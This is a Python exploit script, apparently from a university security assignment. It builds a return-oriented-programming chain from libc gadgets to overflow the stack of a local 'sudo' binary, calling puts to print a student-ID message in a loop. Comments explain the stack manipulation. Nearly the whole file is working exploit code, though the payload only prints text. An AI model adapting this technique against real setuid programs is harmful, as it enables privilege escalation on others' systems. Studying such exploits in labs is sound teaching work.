import os, sys

import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'
PATH_TO_GDB = '/usr/bin/gdb'
LIBC_TEXT_SECTION_START_ADDR= 0xb7c39750


def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg():

	searchObg = GadgetSearch(LIBC_DUMP_PATH,LIBC_TEXT_SECTION_START_ADDR)

	#popEbp = "b7c399a7".decode("hex")
	popEbp = searchObg.find_format('pop ebp')[1][2:].decode("hex")
	#the system expects binary in little-endian convention, so we need to flip the address
	putsAdr = "b7c81ca0".decode("hex")

	#skip = "b7c4d5ea".decode("hex")
	skip = searchObg.find_format('add esp,4')[1][2:].decode("hex")

	stringAdr = "bfffdff8".decode("hex")

	#popEsp = "b7c7b433".decode("hex")
	popEsp = searchObg.find_format('pop esp')[1][2:].decode("hex")

	startAdr = "bfffdfe4".decode("hex")

	popEbp = popEbp[::-1]
	putsAdr= putsAdr[::-1]
	skip= skip[::-1]
	stringAdr= stringAdr[::-1]
	popEsp= popEsp[::-1]

	startAdr= startAdr[::-1]

    #address of return address: 0xbfffdfdc
    #we put popEsp+startAdr to make the stack pointer return to the start of the ROP, if we do just stringAdr+startAdr 
    #it will print once but because the stack pointer already advanced it wont enter infinite loop
    
    #the first thing that puts does is to push ebp, because the location of esp, normally it would overwrite the address of puts
    #that we located on the stack to call the function from,and put the value of ebp instead(which in our case is garbage).
    #but because we inserted the puts address to ebp, the puts address is overrided by the puts address,
    #and the stack stays as it was.

    #we use skip becuase when puts is finished we need to skip over the string address over to the looping instruction,
    #inisde the skip gadget the esp would point to popEsp, and ret inside skip gaadget would take us there

	return 'A'*56 +'BBBB'+ 'CC'+'DDDD'+popEbp+putsAdr+putsAdr+skip+stringAdr+popEsp+startAdr+get_string(207901414)
    
    #an other solution instaed poping to ebp, is runing over ebp with puts address
    #return 'A'*56 +'BBBB'+ 'CC'+putsAdr+skip+skip+putsAdr+skip+stringAdr+popEsp+startAdr+get_string(207901414)

    

def main(argv):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, get_arg())

if __name__ == '__main__':
    main(sys.argv)
